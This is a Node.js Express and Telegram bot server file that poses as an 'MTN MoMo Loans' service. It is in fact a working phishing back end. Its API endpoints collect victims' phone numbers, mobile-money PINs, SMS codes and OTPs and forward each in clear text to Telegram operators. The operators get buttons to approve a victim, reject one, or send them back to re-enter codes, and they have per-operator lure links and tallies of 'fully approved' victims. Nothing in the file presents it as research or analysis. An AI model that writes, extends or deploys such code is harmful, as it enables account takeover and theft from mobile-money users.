// ==========================================
// UPDATED server.js WITH DATABASE INTEGRATION
// ==========================================

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// WEBHOOK MODE (for Render / production)
// ==========================================

const BOT_TOKEN   = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT        = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;

// Create bot WITHOUT polling
const bot = new TelegramBot(BOT_TOKEN);

// In-memory maps
const adminChatIds    = new Map(); // adminId → chatId
const pausedAdmins    = new Set(); // adminIds that are paused
const processingLocks = new Set(); // prevents duplicate pin submissions

let dbReady = false;

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

// Format phone for Telegram display (MTN / regional standard adjustments)
function formatPhone(phoneNumber) {
    if (!phoneNumber) return phoneNumber;
    if (phoneNumber.startsWith('+2560')) return phoneNumber.slice(4); 
    if (phoneNumber.startsWith('+256'))  return '0' + phoneNumber.slice(4); 
    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber; 
    return phoneNumber;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) {
                console.error(`❌ No chat ID for admin: ${adminId}`);
                return null;
            }
            adminChatIds.set(adminId, admin.chatId);
            return await bot.sendMessage(admin.chatId, message, options);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }

    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// BOT COMMAND HANDLERS (set up immediately)
// ==========================================
console.log('⏳ Setting up bot handlers...');

bot.on('error',         (error) => console.error('❌ Bot error:',    error?.message));
bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));

setupCommandHandlers();
console.log('✅ Command handlers configured!');

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    try {
        console.log('📥 Webhook received:', JSON.stringify(req.body).substring(0, 150));
        if (req.body && req.body.update_id !== undefined) {
            try {
                bot.processUpdate(req.body);
                console.log('✅ Update processed');
            } catch (processError) {
                console.error('❌ processUpdate error:', processError);
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// DATABASE INIT + WEBHOOK SETUP
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');

        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSetSuccessfully = false;
        let attempts = 0;

        while (!webhookSetSuccessfully && attempts < 3) {
            attempts++;
            try {
                console.log(`🔄 Attempt ${attempts}/3: Setting webhook to: ${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(resolve => setTimeout(resolve, 1000));

                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false,
                    max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });

                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) {
                        webhookSetSuccessfully = true;
                        console.log(`✅ Webhook CONFIRMED: ${fullWebhookUrl}`);
                    } else {
                        console.error(`❌ Webhook URL mismatch. Got: ${info.url}`);
                    }
                }
            } catch (webhookError) {
                console.error(`❌ Webhook setup error (attempt ${attempts}):`, webhookError.message);
                if (attempts < 3) await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (!webhookSetSuccessfully) {
            console.error('❌❌❌ CRITICAL: Failed to set webhook after all attempts!');
        }

        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Bot connected: @${botInfo.username} (${botInfo.first_name})`);
        } catch (botError) {
            console.error('❌ Bot API error:', botError);
        }

        // Keep-alive + self-ping to prevent Render free tier sleep
        setInterval(() => {
            console.log(`💓 Keep-alive: ${adminChatIds.size} admins connected, ${pausedAdmins.size} paused`);
            const pingUrl = `${WEBHOOK_URL}/health`;
            fetch(pingUrl).catch(() => {});
        }, 14 * 60 * 1000);

        // Webhook health check + auto-fix
        setInterval(async () => {
            try {
                const info  = await bot.getWebHookInfo();
                const isSet = info.url === fullWebhookUrl;
                console.log(`🔍 Webhook: ${isSet ? '✅ SET' : '❌ NOT SET'} | Pending: ${info.pending_update_count || 0}`);
                if (!isSet) {
                    console.log('⚠️ Auto-fixing webhook...');
                    await bot.setWebHook(fullWebhookUrl, {
                        drop_pending_updates: false,
                        max_connections: 40,
                        allowed_updates: ['message', 'callback_query']
                    });
                    console.log('✅ Webhook re-set');
                }
            } catch (error) {
                console.error('⚠️ Webhook check error:', error.message);
            }
        }, 60000);

        console.log('✅ System fully initialized!');
    })
    .catch((error) => {
        console.error('❌ Initialization failed:', error);
        process.exit(1);
    });

// ==========================================
// LOAD ADMIN CHAT IDs FROM DB
// ==========================================
async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        console.log(`📋 Loading ${admins.length} admins from database...`);

        adminChatIds.clear();
        pausedAdmins.clear();

        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }
        console.log(`✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
function setupCommandHandlers() {

    // /start
    bot.onText(/\/start/, async (msg) => {
        const chatId  = msg.chat.id;
        let adminId = getAdminIdByChatId(chatId);

        try {
            // Auto-link chat ID if not in memory but exists in database for this chatId
            if (!adminId) {
                const admins = await db.getAllAdmins();
                const matchedAdmin = admins.find(a => String(a.chatId) === String(chatId));
                if (matchedAdmin) {
                    adminId = matchedAdmin.adminId;
                    adminChatIds.set(adminId, chatId);
                }
            }

            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    await bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\nYour access is temporarily paused.`, { parse_mode: 'Markdown' });
                    return;
                }

                const admin = await db.getAdmin(adminId);
                const isSuperAdmin = adminId === 'ADMIN001';

                let message = `
👋 *Welcome ${admin?.name || 'Admin'} (MTN MoMo Loans)!*

*Your Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}
*Your Personal Link:*
${WEBHOOK_URL}?admin=${adminId}

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information
`;
                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            } else {
                await bot.sendMessage(chatId, `
👋 *Welcome to MTN MoMo Loan Platform!*

Your Chat ID: \`${chatId}\`
Provide this to your super admin to get access.
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error in /start:', error);
        }
    });

    // /mylink
    bot.onText(/\/mylink/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        bot.sendMessage(chatId, `🔗 *YOUR LINK*\n\`${WEBHOOK_URL}?admin=${adminId}\``, { parse_mode: 'Markdown' });
    });

    // /stats
    bot.onText(/\/stats/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *STATISTICS (MTN MoMo)*

📋 Total Apps: ${stats.total || 0}
⏳ PIN Pending: ${stats.pinPending || 0}
⏳ SMS Pending: ${stats.smsPending || 0}
⏳ OTP Pending: ${stats.otpPending || 0}
🎉 Fully Approved: ${stats.fullyApproved || 0}
        `, { parse_mode: 'Markdown' });
    });

    // /pending
    bot.onText(/\/pending/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');

        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const smsPending = adminApps.filter(a => a.smsStatus === 'pending' && a.pinStatus === 'approved');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.smsStatus === 'approved');

        let message = `⏳ *PENDING APPLICATIONS*\n\n`;
        if (pinPending.length > 0) {
            message += `📱 *PIN Stage (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => { message += `${i+1}. ${formatPhone(app.phoneNumber)} - \`${app.id}\`\n`; });
            message += '\n';
        }
        if (smsPending.length > 0) {
            message += `💬 *SMS Stage (${smsPending.length}):*\n`;
            smsPending.forEach((app, i) => { message += `${i+1}. ${formatPhone(app.phoneNumber)} - SMS: \`${app.smsCode}\`\n`; });
            message += '\n';
        }
        if (otpPending.length > 0) {
            message += `🔢 *OTP Stage (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => { message += `${i+1}. ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`; });
        }
        if (pinPending.length === 0 && smsPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    // /myinfo
    bot.onText(/\/myinfo/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `
👤 *ADMIN INFO*
Name: ${admin?.name || 'N/A'}
ID: \`${adminId}\`
Chat ID: \`${chatId}\`
Status: ${admin?.status || 'active'}
        `, { parse_mode: 'Markdown' });
    });
}

// ==========================================
// TELEGRAM CALLBACK HANDLER (3-Step Flow + Reversals)
// ==========================================
bot.on('callback_query', async (callbackQuery) => {
    const chatId    = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data      = callbackQuery.data;
    const adminId   = getAdminIdByChatId(chatId);

    console.log(`\n🔘 CALLBACK: ${data} | admin: ${adminId || 'UNAUTHORIZED'}`);

    if (!adminId || !isAdminActive(chatId)) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unauthorized or paused!', show_alert: true });
    }

    const parts = data.split('_');
    if (parts.length < 4) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid callback data.', show_alert: true });
    }

    const action          = parts[0]; // allow, deny, wrongpin, wrongsms, wrongcode, approve
    const type            = parts[1]; // pin, sms, otp
    const embeddedAdminId = parts[2];
    const applicationId   = parts.slice(3).join('_');

    if (embeddedAdminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application belongs to another admin!', show_alert: true });
    }

    const application = await db.getApplication(applicationId);
    if (!application || application.adminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found!', show_alert: true });
    }

    // ──────────────────────────────────────────
    // 1. PIN STAGE ACTIONS
    // ──────────────────────────────────────────
    if (type === 'pin') {
        if (action === 'deny') {
            await db.updateApplication(applicationId, { pinStatus: 'rejected' });
            await bot.editMessageText(`❌ *PIN REJECTED*\n\n📋 \`${applicationId}\`\n📞 \`${formatPhone(application.phoneNumber)}\`\n🔑 \`${application.pin}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application rejected at PIN stage.' });
        }
        if (action === 'allow') {
            await db.updateApplication(applicationId, { pinStatus: 'approved' });
            await bot.editMessageText(`✅ *PIN APPROVED*\n\n📋 \`${applicationId}\`\nUser proceeding to SMS verification step.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ PIN Approved! User moved to SMS step.' });
        }
    }

    // ──────────────────────────────────────────
    // 2. SMS STAGE ACTIONS (with Reversal support)
    // ──────────────────────────────────────────
    if (type === 'sms') {
        if (action === 'wrongpin') {
            // Reverse back to PIN stage
            await db.updateApplication(applicationId, { pinStatus: 'pending', smsStatus: 'rejected' });
            await bot.editMessageText(`🔄 *REVERSED TO PIN STAGE (Wrong PIN at SMS)*\n\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            return bot.answerCallbackQuery(callbackQuery.id, { text: '🔄 Reversed user back to re-enter PIN.' });
        }
        if (action === 'wrongsms' || action === 'deny') {
            await db.updateApplication(applicationId, { smsStatus: 'wrong_sms' });
            await bot.editMessageText(`❌ *INVALID SMS CODE*\n\n📋 \`${applicationId}\`\nUser requested to re-enter SMS code.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter SMS code.' });
        }
        if (action === 'allow') {
            await db.updateApplication(applicationId, { smsStatus: 'approved' });
            await bot.editMessageText(`✅ *SMS VERIFIED & APPROVED*\n\n📋 \`${applicationId}\`\nUser proceeding to final OTP stage.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ SMS Approved! User moved to OTP step.' });
        }
    }

    // ──────────────────────────────────────────
    // 3. OTP STAGE ACTIONS (with Reversal support)
    // ──────────────────────────────────────────
    if (type === 'otp') {
        if (action === 'wrongpin') {
            // Reverse all the way back to PIN stage
            await db.updateApplication(applicationId, { pinStatus: 'pending', smsStatus: 'pending', otpStatus: 'wrongpin_otp' });
            await bot.editMessageText(`🔄 *REVERSED TO PIN STAGE (Wrong PIN at OTP)*\n\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            return bot.answerCallbackQuery(callbackQuery.id, { text: '🔄 Reversed back to PIN entry.' });
        }
        if (action === 'wrongsms') {
            // Reverse back to SMS stage
            await db.updateApplication(applicationId, { smsStatus: 'pending', otpStatus: 'wrongsms_otp' });
            await bot.editMessageText(`🔄 *REVERSED TO SMS STAGE*\n\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            return bot.answerCallbackQuery(callbackQuery.id, { text: '🔄 Reversed back to SMS entry.' });
        }
        if (action === 'wrongcode') {
            await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
            await bot.editMessageText(`❌ *WRONG OTP CODE*\n\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter OTP code.' });
        }
        if (action === 'approve') {
            await db.updateApplication(applicationId, { otpStatus: 'approved' });
            await bot.editMessageText(`🎉 *MTN MOMO LOAN FULLY APPROVED!*`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            return bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan fully approved!' });
        }
    }
});

// ==========================================
// API ENDPOINTS FOR 3-STEP VERIFICATION
// ==========================================

// Step 1: Verify PIN
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
        const applicationId = `MOMO-${Date.now()}`;

        let assignedAdmin;
        if (assignmentType === 'specific' && requestAdminId) {
            assignedAdmin = await db.getAdmin(requestAdminId);
            if (!assignedAdmin || pausedAdmins.has(requestAdminId)) {
                return res.status(400).json({ success: false, message: 'Invalid or paused admin link.' });
            }
        } else {
            const activeAdmins = (await db.getActiveAdmins()).filter(a => !pausedAdmins.has(a.adminId));
            if (activeAdmins.length === 0) return res.status(503).json({ success: false, message: 'No admins available.' });
            assignedAdmin = activeAdmins[0];
        }

        if (!adminChatIds.has(assignedAdmin.adminId) && assignedAdmin.chatId) {
            adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
        }

        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            smsStatus: 'waiting',
            otpStatus: 'waiting',
            timestamp: new Date().toISOString()
        });

        await sendToAdmin(assignedAdmin.adminId, `
📱 *MTN MoMo - NEW PIN SUBMISSION*

📋 \`${applicationId}\`
📞 \`${formatPhone(phoneNumber)}\`
🔑 PIN: \`${pin}\`
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Reject', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                    [{ text: '✅ Allow -> Next (SMS)', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true, applicationId, assignedAdminId: assignedAdmin.adminId });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// Step 1 status check endpoint
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    const appData = await db.getApplication(req.params.applicationId);
    if (appData) res.json({ success: true, status: appData.pinStatus });
    else res.status(404).json({ success: false });
});

// Step 2: Verify SMS Code
app.post('/api/verify-sms', async (req, res) => {
    try {
        const { applicationId, smsCode } = req.body;
        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        await db.updateApplication(applicationId, { smsCode, smsStatus: 'pending' });

        await sendToAdmin(application.adminId, `
💬 *MTN MoMo - SMS VERIFICATION STEP*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
💬 SMS Code: \`${smsCode}\`
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔄 Reverse to PIN', callback_data: `wrongpin_sms_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Wrong SMS', callback_data: `wrongsms_sms_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Allow -> Next (OTP)', callback_data: `allow_sms_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

app.get('/api/check-sms-status/:applicationId', async (req, res) => {
    const appData = await db.getApplication(req.params.applicationId);
    if (appData) res.json({ success: true, status: appData.smsStatus });
    else res.status(404).json({ success: false });
});

// Step 3: Verify OTP Code
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });

        await sendToAdmin(application.adminId, `
🔢 *MTN MoMo - FINAL OTP STEP*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔢 OTP: \`${otp}\`
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔄 Reverse to PIN', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '🔄 Reverse to SMS', callback_data: `wrongsms_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Wrong Code', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '🎉 Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    const appData = await db.getApplication(req.params.applicationId);
    if (appData) res.json({ success: true, status: appData.otpStatus });
    else res.status(404).json({ success: false });
});

// ==========================================
// HEALTH & LANDING PAGE
// ==========================================
app.get('/health', (req, res) => {
    res.json({ status: 'ok', platform: 'MTN MoMo Loans', activeAdmins: adminChatIds.size });
});

app.get('/', async (req, res) => {
    res.sendFile(path.join(__dirname, 'momo-loans.html'));
});

// ==========================================
// START SERVER
// ==========================================
app.listen(PORT, () => {
    console.log(`\n🟡 MTN MOMO LOANS PLATFORM`);
    console.log(`=============================`);
    console.log(`🌐 Server running on port ${PORT}`);
    console.log(`🤖 Bot Webhook active\n`);
});
